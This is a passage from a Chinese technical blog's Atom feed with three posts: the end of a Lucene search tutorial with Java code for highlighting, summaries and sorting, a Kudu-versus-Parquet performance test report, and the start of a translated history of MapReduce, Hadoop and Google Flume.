class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    String keywords = <span class="string">"钟福成"</span>;</span><br><span class="line">    List&lt;Article&gt; articleList = <span class="keyword">new</span> ArrayList&lt;Article&gt;();</span><br><span class="line">    QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br><span class="line">    Query query = queryParser.parse(keywords);</span><br><span class="line">    IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtil.getDirectory());</span><br><span class="line">    TopDocs topDocs = indexSearcher.search(query,<span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置关键字高亮</span></span><br><span class="line">    Formatter formatter = <span class="keyword">new</span> SimpleHTMLFormatter(<span class="string">"&lt;font color='red'&gt;"</span>,<span class="string">"&lt;/font&gt;"</span>);</span><br><span class="line">    Scorer scorer = <span class="keyword">new</span> QueryScorer(query);</span><br><span class="line">    Highlighter highlighter = <span class="keyword">new</span> Highlighter(formatter,scorer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;topDocs.scoreDocs.length;i++)&#123;</span><br><span class="line">        ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">        <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">        Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置内容高亮</span></span><br><span class="line">        String highlighterContent = highlighter.getBestFragment(LuceneUtil.getAnalyzer(),<span class="string">"content"</span>,document.get(<span class="string">"content"</span>));</span><br><span class="line">        document.getField(<span class="string">"content"</span>).setValue(highlighterContent);</span><br><span class="line"></span><br><span class="line">        Article article = (Article) LuceneUtil.document2javabean(document,Article.class);</span><br><span class="line">        articleList.add(article);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Article article : articleList)&#123;</span><br><span class="line">        System.out.println(article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="搜索结果摘要"><a href="#搜索结果摘要" class="headerlink" title="搜索结果摘要"></a>搜索结果摘要</h4><p>如果我们搜索出来的文章内容太大了，而我们只想显示部分的内容，那么我们可以对其进行摘要…</p><p>值得注意的是：搜索结果摘要需要与设置高亮一起使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">String keywords = <span class="string">"钟福成"</span>;</span><br><span class="line">        List&lt;Article&gt; articleList = <span class="keyword">new</span> ArrayList&lt;Article&gt;();</span><br><span class="line">        QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br><span class="line">        Query query = queryParser.parse(keywords);</span><br><span class="line">        IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtil.getDirectory());</span><br><span class="line">        TopDocs topDocs = indexSearcher.search(query,<span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">        Formatter formatter = <span class="keyword">new</span> SimpleHTMLFormatter(<span class="string">"&lt;font color='red'&gt;"</span>,<span class="string">"&lt;/font&gt;"</span>);</span><br><span class="line">        Scorer scorer = <span class="keyword">new</span> QueryScorer(query);</span><br><span class="line">        Highlighter highlighter = <span class="keyword">new</span> Highlighter(formatter,scorer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置摘要</span></span><br><span class="line">        Fragmenter fragmenter  = <span class="keyword">new</span> SimpleFragmenter(<span class="number">4</span>);</span><br><span class="line">        highlighter.setTextFragmenter(fragmenter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;topDocs.scoreDocs.length;i++)&#123;</span><br><span class="line">            ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">            <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">            Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">            String highlighterContent = highlighter.getBestFragment(LuceneUtil.getAnalyzer(),<span class="string">"content"</span>,document.get(<span class="string">"content"</span>));</span><br><span class="line">            document.getField(<span class="string">"content"</span>).setValue(highlighterContent);</span><br><span class="line"></span><br><span class="line">            Article article = (Article) LuceneUtil.document2javabean(document,Article.class);</span><br><span class="line">            articleList.add(article);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(Article article : articleList)&#123;</span><br><span class="line">            System.out.println(article);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="搜索结果排序"><a href="#搜索结果排序" class="headerlink" title="搜索结果排序"></a>搜索结果排序</h4><p>我们搜索引擎肯定用得也不少，使用不同的搜索引擎来搜索相同的内容。他们首页的排行顺序也会不同…这就是它们内部用了搜索结果排序….</p><p>影响网页的排序有非常多种：</p><ul><li>head/meta/【keywords关键字】</li><li>网页的标签整洁</li><li>网页执行速度</li><li>采用div+css</li><li>等等等等</li></ul><p>而在Lucene中我们就可以设置相关度得分来使不同的结果对其进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IndexWriter indexWriter = new IndexWriter(LuceneUtil.getDirectory(),LuceneUtil.getAnalyzer(),LuceneUtil.getMaxFieldLength());</span><br><span class="line">//为结果设置得分</span><br><span class="line">document.setBoost(20F);</span><br><span class="line">indexWriter.addDocument(document);</span><br><span class="line">indexWriter.close();</span><br></pre></td></tr></table></figure><p>当然了，我们也可以按单个字段排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//true表示降序</span></span><br><span class="line">Sort sort = <span class="keyword">new</span> Sort(<span class="keyword">new</span> SortField(<span class="string">"id"</span>,SortField.INT,<span class="keyword">true</span>));</span><br><span class="line">TopDocs topDocs = indexSearcher.search(query,<span class="keyword">null</span>,<span class="number">1000000</span>,sort);</span><br></pre></td></tr></table></figure><p>也可以按多个字段排序：在多字段排序中，<strong>只有第一个字段排序结果相同时，第二个字段排序才有作用 提倡用数值型排序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sort sort = <span class="keyword">new</span> Sort(<span class="keyword">new</span> SortField(<span class="string">"count"</span>,SortField.INT,<span class="keyword">true</span>),<span class="keyword">new</span> SortField(<span class="string">"id"</span>,SortField.INT,<span class="keyword">true</span>));</span><br><span class="line">TopDocs topDocs = indexSearcher.search(query,<span class="keyword">null</span>,<span class="number">1000000</span>,sort);</span><br></pre></td></tr></table></figure><h4 id="条件搜索"><a href="#条件搜索" class="headerlink" title="条件搜索"></a>条件搜索</h4><p>在我们的例子中，我们使用的是根据一个关键字来对某个字段的内容进行搜索。语法类似于下面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QueryParser queryParser = <span class="keyword">new</span> QueryParser(LuceneUtil.getVersion(),<span class="string">"content"</span>,LuceneUtil.getAnalyzer());</span><br></pre></td></tr></table></figure><p>其实，我们也可以使用关键字来对多个字段进行搜索，也就是多条件搜索。<strong>我们实际中常常用到的是多条件搜索，多条件搜索可以使用我们最大限度匹配对应的数据</strong>！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QueryParser queryParser = <span class="keyword">new</span> MultiFieldQueryParser(LuceneUtil.getVersion(),<span class="keyword">new</span> String[]&#123;<span class="string">"content"</span>,<span class="string">"title"</span>&#125;,LuceneUtil.getAnalyzer());</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>Lucene是全文索引引擎的祖先</strong>，后面的Solr、Elasticsearch都是基于Lucene的(后面会有一篇讲Elasticsearch的，敬请期待～)</li><li><p>Lucene中存的就是一系列的<strong>二进制压缩文件和一些控制文件</strong>,这些内容统称为<strong>索引库</strong>,索引库又分了两个部分：词汇表、词汇表</p></li><li><p>了解索引库的优化方式：1、合并文件  2、设置内存索引库</p></li><li>Lucene的分词器有非常多种，选择自己适合的一种进行分词</li><li>查询出来的结果可对其设置高亮、摘要、排序</li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ES这个组件其实挺重要的，早就应该了解的组件，借着这次机会，我尽量把这个组件摸摸透&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="ElasticSearch" scheme="http://yoursite.com/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://yoursite.com/tags/ElasticSearch/"/>
    
      <category term="Apach Lucene" scheme="http://yoursite.com/tags/Apach-Lucene/"/>
    
  </entry>
  
  <entry>
    <title>Kudu测试报告</title>
    <link href="http://yoursite.com/2019/06/19/kudu_test/"/>
    <id>http://yoursite.com/2019/06/19/kudu_test/</id>
    <published>2019-06-19T08:33:51.894Z</published>
    <updated>2019-06-21T08:46:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>数据模拟完成后的 Kudu 对比性能测试</p></blockquote><a id="more"></a> <h3 id="测试介绍"><a href="#测试介绍" class="headerlink" title="测试介绍"></a>测试介绍</h3><p>TPCDS 和 TPCH 是专门为超大数据量设置的测试项目，下面的是Kudu官网上官方用TPCH测试的结果：</p><p><img src="https://o59mpa.by.files.1drv.com/y4mA8w9Pf83M66l791AicbzEiuNzwVX4g4cBec-VP___6-UAnjPtWMl-GL4worC01W_SVpnXxhqIib-CTLsjnNi0DAjav_B5FpF9JVfWq1dgF0YZwb8SPSGgZl88X96ZhvR9-AysqpK3a6Wbt5L_oFf1L-JabZic5epZcecBgL_Hs937A5vMe_Y9HnWoepnsnctIat0QIijPkQsXI8aulx7yg?width=574&amp;height=258&amp;cropmode=none" alt></p><p>我自己做的表格也是模仿的<a href="https://kudu.apache.org/overview.html" target="_blank" rel="noopener">官方的图表</a>格式。</p><p>介绍一下这个图表的含义，TPCH测试中含有很多超复杂SQL，用不同的数据库在相同数据下运行了这些语句之后，然后对比运行时间，图表横坐标是SQL的序号，纵坐标是运行时间，官方的运行环境是75节点的，单位是毫秒。</p><h3 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h3><p>下面是我做的测试，三节点下的kudu，机器配置都是64G内存，16核心，系统是Centos 7.4，Kudu版本是1.5，SQL是用impala+Kudu的形式运行的，测试数据量是用TPCDS生成的100G数据。</p><p><img src="https://oj9gpa.by.files.1drv.com/y4mMCX7UM5aW2Q-AcVklQJrf5ZZ72ypNIIrCkO1UakfnMLQ7gfq3KudD80TWG0CpUUJ2zR_aAEiMTPKznwaIcKpLDxRnoYpgnnuyQ-uMGT0zuVrrOvpG3zyPP2CZKVXcS-v1bPxU3xZ1etv2t_9e-lDnftN2cYqM29n_OIZPWOx6NF7jo5EPXx9FOLyipipqNZdR2eVhoHutBQSIMrW9xyXVw?width=1443&amp;height=691&amp;cropmode=none" alt></p><p>我的测试相比官方的添加了文本格式的HiveSQL测试，测试下来确实是速度最慢的。</p><p>Kudu和parquet各有千秋，和官方的测试结果相差不大。</p><h3 id="写入性能"><a href="#写入性能" class="headerlink" title="写入性能"></a>写入性能</h3><p>Kudu的写入性能测试的时候没有能够完全发挥出来，短板不在kudu的写入，这边的写入测试是我用脚本统计5分钟内表多出来的行数然后除以600s得到的，这边截取一段（因为是5分钟统计一次，图表的表述可能不够准确）</p><p><img src="https://o59lpa.by.files.1drv.com/y4mTSkFgZzq__Ts2m5ZTdUr9MBUPBEGXJnEzp3ss_3cDbmVjyxh3gMkQnD0ZBVa5AGdeACWzycw83MmAoszRmiMgdFZgFrbviTB7gckxqw0fTDGuohEWxSo2npNc90L6oRZA1b7l5EizbDLEjJTlpTnWmLtu6dPnJeNxOwdKdPgYziqEisqyfE7rLS0Ekk3yEOgii45aCJ_hfZ2QU99_71yOw?width=476&amp;height=286&amp;cropmode=none" alt></p><p>监测过程中得到的最大写入速度在9.5w/s左右，大部分时候速度在3.5w条到5w条之间。</p><p>后来在开启多线程写入kudu的时候，kudu的写入速度很轻松就能达到20w/s，但是可能因为资源不足，kudu的tablet Server容易挂掉，因为impala也是非常吃内存的组件，64G有点捉襟见肘。</p><h4 id="kudu写入速度和表格大小的关系"><a href="#kudu写入速度和表格大小的关系" class="headerlink" title="kudu写入速度和表格大小的关系"></a>kudu写入速度和表格大小的关系</h4><p>kudu的这个写入速度和表格大小有直接关系。</p><p>结论：</p><p><strong>kudu导入小表的速度十分快，但是导入大表的时候性能会严重下降。</strong></p><p>为了避免测试误差，在用tpcds生成不同大小的测试样本中取相同表格不同大小来测试，避免阻断等等误差，测试结果如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g47cbzp1cuj20d407vdfp.jpg" alt></p><p>根据测试结果基本可以判断，我们测试集群环境下，小表的导入速度明显要比大表大很多。</p><p>类似的，我们根据TPCDS生成的不同大小的数据样本，分析数据量大小对kudu的影响（这边的数据来源网易的报告，1T的因为测试集群环境原因没有测试）：</p><p>100G:</p><p><img src="http://wx3.sinaimg.cn/large/bec9bff2gy1g47lubfzqyj20r80hzacf.jpg" alt></p><p>1T:</p><p><img src="http://wx3.sinaimg.cn/large/bec9bff2gy1g47lu7zq04j20qy0hbq3l.jpg" alt></p><p>根据上面两张折线图可以看出，随着表的数据量变成巨大，kudu和parquet的之间的性能也被拉开了。</p><p>10T:</p><p><img src="http://wx2.sinaimg.cn/large/bec9bff2gy1g47m9zhf2dj20p20h6gm3.jpg" alt></p><p>1T的和10T的相差不是特别大</p><p>结论：<strong>kudu表目前看来不太适合大表，分区能否解决这个问题，还要靠实验</strong></p><h4 id="资源使用情况"><a href="#资源使用情况" class="headerlink" title="资源使用情况"></a>资源使用情况</h4><p>Impala使用的资源整体上少于Spark，磁盘的读取少于Spark，这对于速度的提高至关重要，这与其语句的优化有关。Impala的CPU一直维持在较低的水平，说明其C++的实现比Java高效。</p><h4 id="kudu写入速度"><a href="#kudu写入速度" class="headerlink" title="kudu写入速度"></a>kudu写入速度</h4><p>Spark的CPU占用较高，但是维持在50%的水平，可见CPU并没有成为其瓶颈，在使用Oozie多线程写入的时候可能遇到了kudu的瓶颈，Kudu的写入瓶颈是可以通过一些参数进行简单调整的。</p><p>目前从集群的写入速度上来分析，初步判断硬盘的写入速度已经成为了瓶颈。</p><p>下图以Master节点为例，列出的Kudu TS以6个小时为一个窗口使用磁盘的峰值和平均值：</p><p><img src="https://arbgdq.by.files.1drv.com/y4mcprp_tVDZU3zFzgcmpoJtNJKwwr5PEVDcLXL_K-4D9X9ST4Vru8dYseDZ8sUPMTd7LwyKYe7MQI1fkaeXZGZG6ZyHTMGE1OvqLVCIJOBpK1NFAbatJZ6fmTTlvZjc6fFYT_8cCFOLjYhbWKeqbalRJ70sWjBHvRgqcnyyKKvhFltneMaGeQx4iunOQC-yk5_p-KmD3H_8tko7WCCj45ZDw?width=451&amp;height=289&amp;cropmode=none" alt></p><p>MiB单位换算成Mbit/s是Mbit/s = MiB/s * 0.1192，图中所示峰值几乎达到了机械硬盘写入极限。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;数据模拟完成后的 Kudu 对比性能测试&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Kudu" scheme="http://yoursite.com/categories/Hadoop/Kudu/"/>
    
    
      <category term="Kudu" scheme="http://yoursite.com/tags/Kudu/"/>
    
      <category term="test" scheme="http://yoursite.com/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>大规模数据处理的演化历程</title>
    <link href="http://yoursite.com/2019/06/18/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97%E6%B5%AA%E6%BD%AE/"/>
    <id>http://yoursite.com/2019/06/18/流式计算浪潮/</id>
    <published>2019-06-18T07:40:44.238Z</published>
    <updated>2019-05-28T10:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。</p></blockquote><p>我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。</p><p>第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。</p><p>那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。</p><p>下面是原文：</p></blockquote><a id="more"></a> <h2 id="大规模数据处理的演化历程"><a href="#大规模数据处理的演化历程" class="headerlink" title="大规模数据处理的演化历程"></a>大规模数据处理的演化历程</h2><p>大数据如果从 Google 对外发布 MapReduce 论文算起，已经前后跨越十五年，我打算在本文和你蜻蜓点水般一起浏览下大数据的发展史，我们从最开始 MapReduce 计算模型开始，一路走马观花看看大数据这十五年关键发展变化，同时也顺便会讲解流式处理这个领域是如何发展到今天的这幅模样。这其中我也会加入一些我对一些业界知名大数据处理系统 (可能里面有些也不那么出名) 的观察和评论，同时考虑到我很有可能简化、低估甚至于忽略了很多重要的大数据处理系统，我也会附带一些参考材料帮助大家学习更多更详细的知识。</p><p>另外，我们仅仅讨论了大数据处理中偏 MapReduce/Hadoop 系统及其派系分支的大数据处理。我没有讨论任何 SQL 引擎 [1]，我们同样也没有讨论 HPC 或者超级计算机。尽管我这章的标题听上去领域覆盖非常广泛，但实际上我仅仅会讨论一个相对比较垂直的大数据领域。</p><p>同样需要提醒的一件事情是，我在本文里面或多或少会提到一些 Google 的技术，不用说这块是因为与我在谷歌工作了十多年的经历有关。 但还有另外两个原因：1）大数据对谷歌来说一直很重要，因此在那里创造了许多有价值的东西值得详细讨论，2）我的经验一直是 谷歌以外的人似乎更喜欢学习 Google 所做的事情，因为 Google 公司在这方面一直有点守口如瓶。 所以，当我过分关注我们一直在”闭门造车”的东西时，姑且容忍下我吧。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h75jzktjj20u00e80sx.jpg" alt></p><p>为了使我们这一次大数据旅行显得更加具体有条理，我们设计了图 10-1 的时间表，这张时间表概括地展示了不同系统的诞生日期。</p><p>在每一个系统介绍过程中，我会尽可能说明清楚该系统的简要历史，并且我会尝试从流式处理系统的演化角度来阐释该系统对演化过程的贡献。最后，我们将回顾以上系统所有的贡献，从而全面了解上述系统如何演化并构建出现代流式处理系统的。</p><h3 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h3><p>我们从 MapReduce 开始我们的旅程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76cbmb5j20u00e4glt.jpg" alt></p><p>我认为我们可以很确定地说，今天我们讨论的大规模数据处理系统都源自于 2003 年 MapReduce。当时，谷歌的工程师正在构建各种定制化系统，以解决互联网时代下大数据处理难题。当他们这样尝试去解决这些问题时候，发现有三个难以逾越的坎儿：</p><ul><li>数据处理很难 只要是数据科学家或者工程师都很清楚。如果你能够精通于从原始数据挖掘出对企业有价值的信息，那这个技能能够保你这辈子吃喝不愁。</li><li>可伸缩性很难 本来数据处理已经够难了，要从大规模数据集中挖掘出有价值的数据更加困难。</li><li>容错很难 要从大规模数据集挖掘数据已经很难了，如果还要想办法在一批廉价机器构建的分布式集群上可容错地、准确地方式挖掘数据价值，那真是难于上青天了。</li></ul><p>在多种应用场景中都尝试解决了上述三个问题之后，Google 的工程师们开始注意到各自构建的定制化系统之间颇有相似之处。最终，Google 工程师悟出来一个道理: 如果他们能够构建一个可以解决上述问题二和问题三的框架，那么工程师就将可以完全放下问题二和三，从而集中精力解决每个业务都需要解决的问题一。于是，MapReduce 框架诞生了。</p><p>MapReduce 的基本思想是提供一套非常简洁的数据处理 API，这套 API 来自于函数式编程领域的两个非常易于理解的操作：map 和 reduce（图 10-3）。使用该 API 构建的底层数据流将在这套分布式系统框架上执行，框架负责处理所有繁琐的可扩展性和容错性问题。可扩展性和容错性问题对于分布式底层工程师来说无疑是非常有挑战的课题，但对于我们普通工程师而言，无益于是灾难。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76jh1w8j20u00e20t6.jpg" alt></p><p>我们已经在第 6 章详细讨论了 MapReduce 的语义，所以我们在此不再赘述。仅仅简单地回想一下，我们将处理过程分解为六个离散阶段（MapRead，Map，MapWrite，ReduceRead，Reduce，ReduceWrite）作为对于流或者表进行分析的几个步骤。我们可以看到，整体上 Map 和 Reduce 阶段之间差异其实也不大 ; 更高层次来看，他们都做了以下事情：</p><ul><li>从表中读取数据，并转换为数据流 (译者注: 即 MapRead、ReduceRead)</li><li>针对上述数据流，将用户编写业务处理代码应用于上述数据流，转换并形成新的一个数据流。 (译者注: 即 Map、Reduce)</li><li>将上述转换后的流根据某些规则分组，并写出到表中。 (译者注: 即 MapWrite、ReduceWrite)</li></ul><p>随后，Google 内部将 MapReduce 投入生产使用并得到了非常广泛的业务应用，Google 认为应该和公司外的同行分享我们的研究成果，最终我们将 MapReduce 论文发表于 OSDI 2004（见图 10-4）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76rug8xj20u00lrwhb.jpg" alt></p><p>论文中，Google 详细描述了 MapReduce 项目的历史，API 的设计和实现，以及有关使用了 MapReduce 框架的许多不同生产案例的详细信息。当然，Google 没有提供任何实际的源代码，以至于最终 Google 以外的人都认为：“是的，这套系统确实牛啊！”，然后立马回头去模仿 MapReduce 去构建他们的定制化系统。</p><p>在随后这十年的过程中，MapReduce 继续在谷歌内部进行大量开发，投入大量时间将这套系统规模推进到前所未有的水平。如果读者朋友希望了解一些更加深入更加详细的 MapReduce 说明，我推荐由我们的 MapReduce 团队中负责扩展性、性能优化的大牛 Marián Dvorský撰写的文章《History of massive-scale sorting experiments at Google》（图 10-5）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76yqegmj20os0oj75n.jpg" alt></p><p>我这里希望强调的是，这么多年来看，其他任何的分布式架构最终都没有达到 MapReduce 的集群规模，甚至在 Google 内部也没有。从 MapReduce 诞生起到现在已经跨越十载之久，都未能看到真正能够超越 MapReduce 系统规模的另外一套系统，足见 MapReduce 系统之成功。14 年的光阴看似不长，对于互联网行业已然永久。</p><p>从流式处理系统来看，我想为读者朋友强调的是 MapReduce 的简单性和可扩展性。 MapReduce 给我们的启发是：MapReduce 系统的设计非常勇于创新，它提供一套简便且直接的 API，用于构建业务复杂但可靠健壮的底层分布式数据 Pipeline，并足够将这套分布式数据 Pipeline 运行在廉价普通的商用服务器集群之上。</p><h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><p>我们大数据旅程的下一站是 Hadoop（图 10-6）。需要着重说明的是：我为了保证我们讨论的重心不至于偏离太多，而压缩简化讨论 Hadoop 的内容。但必须承认的是，Hadoop 对我们的行业甚至整个世界的影响不容小觑，它带来的影响远远超出了我在此书讨论的范围。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77gg7y9j20u00dwdg1.jpg" alt></p><p>Hadoop 于 2005 年问世，当时 Doug Cutting 和 Mike Cafarella 认为 MapReduce 论文中的想法太棒了，他们在构建 Nutch webcrawler 的分布式版本正好需要这套分布式理论基础。在这之前，他们已经实现了自己版本的 Google 分布式文件系统（最初称为 Nutch 分布式文件系统的 NDFS，后来改名为 HDFS 或 Hadoop 分布式文件系统）。因此下一步，自然而然的，基于 HDFS 之上添加 MapReduce 计算层。他们称 MapReduce 这一层为 Hadoop。</p><p>Hadoop 和 MapReduce 之间的主要区别在于 Cutting 和 Cafarella 通过开源（以及 HDFS 的源代码）确保 Hadoop 的源代码与世界各地可以共享，最终成为 Apache Hadoop 项目的一部分。雅虎聘请 Cutting 来帮助将雅虎网络爬虫项目升级为全部基于 Hadoop 架构，这个项目使得 Hadoop 有效提升了生产可用性以及工程效率。自那以后，整个开源生态的大数据处理工具生态系统得到了蓬勃发展。与 MapReduce 一样，相信其他人已经能够比我更好地讲述了 Hadoop 的历史。我推荐一个特别好的讲解是 Marko Bonaci 的《The history of Hadoop》，它本身也是一本已经出版的纸质书籍（图 10-7）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77mn4tmj20u00n8jsn.jpg" alt></p><p>在 Hadoop 这部分，我期望读者朋友能够了解到围绕 Hadoop 的开源生态系统对整个行业产生的巨大影响。通过创建一个开放的社区，工程师可以从早期的 GFS 和 MapReduce 论文中改进和扩展这些想法，这直接促进生态系统的蓬勃发展，并基于此之上产生了许多有用的工具，如 Pig，Hive，HBase，Crunch 等等。这种开放性是导致我们整个行业现有思想多样性的关键，同时 Hadoop 开放性生态亦是直接促进流计算系统发展。</p><h3 id="flume"><a href="#flume" class="headerlink" title="flume"></a>flume</h3><p>我们现在再回到 Google，讨论 Google 公司中 MapReduce 的官方继承者：Flume（[图 10-8]，有时也称为 FlumeJava，这个名字起源于最初 Flume 的 Java 版本。需要注意的是，这里的 Flume 不要与 Apache Flume 混淆，这部分是面向不同领域的东西，只是恰好有同样的名字）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77zrwe0j20u00dwjrl.jpg" alt></p><p>Flume 项目由 Craig Chambers 在 2007 年谷歌西雅图办事处成立时发起。Flume 最初打算是希望解决 MapReduce 的一些固有缺点，这些缺点即使在 MapReduce 最初大红大紫的阶段已经非常明显。其中许多缺点都与 MapReduce 完全限定的 Map→Shuffle→Reduce 编程模型相关 ; 这个编程模型虽然简单，但它带来了一些缺点：</p><ul><li>由于单个 MapReduce 作业并不能完成大量实际上的业务案例，因此许多定制的编排系统开始在 Google 公司内部出现，这些编排系统主要用于协调 MapReduce 作业的顺序。这些系统基本上都在解决同一类问题，即将多个 MapReduce 作业粘合在一起，创建一个解决复杂问题的数据管道。然而，这些编排系统都是 Google 各自团队独立开发的，相互之间也完全不兼容，是一类典型的重复造轮子案例。</li><li>更糟糕的是，由于 MapReduce 设计的 API 遵循严格结构，在很多情况下严格遵循 MapReduce 编程模型会导致作业运行效率低下。例如，一个团队可能会编写一个简单地过滤掉一些元素的 MapReduce，即，仅有 Map 阶段没有 Reduce 阶段的作业。这个作业下游紧接着另一个团队同样仅有 Map 阶段的作业，进行一些字段扩展和丰富 (仍然带一个空的 Reduce 阶段作业）。第二个作业的输出最终可能会被第三个团队的 MapReduce 作业作为输入，第三个作业将对数据执行某些分组聚合。这个 Pipeline，实际上由一个合并 Map 阶段 (译者注: 前面两个 Map 合并为一个 Map)，外加一个 Reduce 阶段即可完成业务逻辑，但实际上却需要编排三个完全独立的作业，每个作业通过 Shuffle 和 Output 两个步骤链接在一起。假设你希望保持代码的逻辑性和清洁性，于是你考虑将部分代码进行合并，但这个最终导致第三个问题。</li><li>为了优化 MapReduce 作业中的这些低效代码，工程师们开始引入手动优化，但不幸的是，这些优化会混淆 Pipeline 的简单逻辑，进而增加维护和调试成本。</li></ul><p>Flume 通过提供可组合的高级 API 来描述数据处理流水线，从而解决了这些问题。这套设计理念同样也是 Beam 主要的抽象模型，即 PCollection 和 PTransform 概念，如图 10-9 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h785ps5gj20u00e50st.jpg" alt></p><p>这些数据处理 Pipeline 在作业启动时将通过优化器生成，优化器将以最佳效率生成 MapReduce 作业，然后交由框架编排执行。整个编译执行原理图可以在图 10-10 中看到。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78bx6woj20u00fb0sv.jpg" alt></p><p>也许 Flume 在自动优化方面最重要的案例就是是合并（Reuven 在第 5 章中讨论了这个主题），其中两个逻辑上独立的阶段可以在同一个作业中顺序地（消费者 - 生产者融合）执行或者并行执行（兄弟融合），如图 10-11 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78hq0dzj20u00gwglp.jpg" 